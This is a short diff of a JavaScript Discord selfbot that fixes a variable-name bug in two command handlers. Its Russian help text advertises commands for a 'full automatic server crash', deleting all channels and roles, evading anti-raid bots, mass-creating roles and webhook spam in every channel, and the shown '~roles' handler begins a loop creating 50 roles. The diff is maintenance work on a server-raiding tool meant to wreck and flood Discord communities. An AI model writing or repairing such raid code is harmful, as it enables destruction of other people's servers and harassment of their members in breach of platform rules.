@@ -132,7 +132,7 @@ client.on('message', message => {
 
 client.on('message', (msg) => {
   if (msg.content === '~help') {
-  if (allowedusers.includes(message.author.id)) {
+  if (allowedusers.includes(msg.author.id)) {
     msg.delete();
     let now = Date.now()
     msg.channel.send('`~auto` - **полный автоматический краш сервера**\n`~nuke` - **удаление всех каналов и ролей**\n`~ping` - **показывает задержку селф бота**\n`~renamechannels` - **обходит анти-краш ботов**\n`~roles` - **создание ролей**\n`~hookall` - **спам во все каналы вебюхуками**\n`~createhooks` - **создание вебхуков везде**')
@@ -146,7 +146,7 @@ client.on('message', (msg) => {
 
 client.on('message', (msg) => {
   if (msg.content === '~roles') {
-  if (allowedusers.includes(message.author.id)) {
+  if (allowedusers.includes(msg.author.id)) {
     msg.delete();
     for (let i = 1; i <= 50; i++) {
         msg.guild.roles
